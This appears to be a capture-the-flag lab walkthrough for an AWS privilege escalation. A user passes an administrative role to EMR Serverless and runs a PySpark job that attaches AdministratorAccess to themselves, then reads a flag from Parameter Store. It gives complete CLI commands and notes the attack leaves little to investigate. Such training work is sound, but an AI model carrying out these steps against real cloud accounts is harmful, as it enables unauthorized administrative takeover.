# Guided Walkthrough: Privilege Escalation via iam:PassRole + emr-serverless:CreateApplication + emr-serverless:StartJobRun

This scenario demonstrates a privilege escalation where a user with `iam:PassRole`, `emr-serverless:CreateApplication`, and `emr-serverless:StartJobRun` permissions can submit a PySpark job to an EMR Serverless application running under an administrative role, and use that job to attach `AdministratorAccess` to themselves.

EMR Serverless removes the cluster-provisioning overhead of regular EMR -- you submit a job and the service handles compute. The job runs under a customer-supplied job-execution role (the "PassRole target"). When that role is administrative, the PySpark script can call IAM and perform any action allowed to the role. The attacker stages a script in an S3 bucket they control, points the job at it, and the job's `boto3` client runs `iam:AttachUserPolicy` under the admin role's credentials.

This is the "PassRole + Compute Service" privilege escalation pattern applied to EMR Serverless, similar to the EMR (`emr-001`), Glue, and Batch variants but with faster startup (~1-2 minutes versus 5-15 for managed EMR).

## The Challenge

You start as `pl-prod-emr-serverless-001-to-admin-starting-user` -- an IAM user with `iam:PassRole` (scoped to the admin role), `emr-serverless:CreateApplication`, and `emr-serverless:StartJobRun`. Your goal is to reach effective administrator access in the account.

There is also an IAM role, `pl-prod-emr-serverless-001-to-admin-admin-role`, with `AdministratorAccess` attached. This role trusts `emr-serverless.amazonaws.com`, meaning EMR Serverless can assume it as the job execution role.

A pre-staged PySpark script lives in an attacker-controlled S3 bucket (the bucket policy grants the prod account read access). The script calls `iam:AttachUserPolicy` against the starting user. The starting user does *not* have `s3:PutObject` -- the script is set up by infrastructure rather than uploaded at attack time.

Can you weaponize the EMR Serverless `CreateApplication` + `StartJobRun` flow to make the admin role execute that script?

## Reconnaissance

Confirm your identity and verify that you don't already have admin access.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-emr-serverless-001-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- you are not admin yet
```

## Exploitation

### Step 1: Create the EMR Serverless application

EMR Serverless requires an "application" object before you can submit jobs. The application defines the runtime and capacity; it has no security implications by itself.

```bash
ADMIN_ROLE_ARN="arn:aws:iam::{account_id}:role/pl-prod-emr-serverless-001-to-admin-admin-role"
SCRIPT_S3="s3://pl-emr-serverless-001-scripts-{attacker_account_id}-{suffix}/exploit.py"

aws emr-serverless create-application \
    --name pl-prod-emr-serverless-001-attack-app \
    --release-label emr-7.0.0 \
    --type SPARK \
    --query 'applicationId' --output text
# 00abcdef0123456
```

Wait until the application is in `CREATED` state (poll `get-application`).

### Step 2: Submit the job, passing the admin role

`StartJobRun` is where the `iam:PassRole` check fires -- you're passing the admin role as the `executionRoleArn`. The job entrypoint points at the attacker-controlled PySpark script.

```bash
APP_ID="00abcdef0123456"

aws emr-serverless start-job-run \
    --application-id "$APP_ID" \
    --execution-role-arn "$ADMIN_ROLE_ARN" \
    --job-driver "{\"sparkSubmit\":{\"entryPoint\":\"$SCRIPT_S3\"}}" \
    --query 'jobRunId' --output text
# 00fedcba9876543
```

The job is now running under the admin role's credentials inside the EMR Serverless worker. The PySpark script's `boto3` client inherits those credentials via IMDS-equivalent metadata.

### Step 3: Wait for the job to complete

Poll `get-job-run` every 15-30 seconds. EMR Serverless typically completes a short PySpark job in 1-2 minutes (much faster than managed EMR).

```bash
aws emr-serverless get-job-run \
    --application-id "$APP_ID" \
    --job-run-id "$JOB_RUN_ID" \
    --query 'jobRun.state' --output text
# PENDING -> SCHEDULED -> RUNNING -> SUCCESS
```

A status of `SUCCESS` confirms the PySpark script ran successfully under the admin role.

## Verification

Wait about 15 seconds for the IAM policy change to propagate, then verify using the starting user credentials (not readonly credentials -- verifying with readonly would be a false positive since readonly has independent read permissions):

```bash
aws iam list-attached-user-policies \
    --user-name pl-prod-emr-serverless-001-to-admin-starting-user \
    --query 'AttachedPolicies[*].PolicyArn' --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3
# Successfully returns user list -- you have admin access
```

## Capture the Flag

Admin access isn't the finish line -- the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using the starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/emr-serverless-001-to-admin \
    --query 'Parameter.Value' --output text
# flag{...}  -- your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them -- only the scenario ID in the path changes.

## What Happened

The attack exploited the "PassRole + Compute Service" pattern: `iam:PassRole` let you delegate the admin role to EMR Serverless as the job execution role, and `emr-serverless:StartJobRun` let you define what code runs under that role. The PySpark worker assumed the admin role automatically via the service's internal credentials wiring, and the script called `iam:AttachUserPolicy` under those admin credentials -- permanently granting your starting user `AdministratorAccess`.

In real environments this pattern appears when data engineers are given EMR Serverless permissions to run interactive analytics, but the job execution role they're allowed to pass is over-broad. EMR Serverless is especially attractive for this pattern compared to managed EMR because the startup time is short (1-2 minutes versus 5-15), the cost-at-rest is zero, and there's no cluster artifact to investigate after the fact -- the application can be deleted immediately after the job completes.
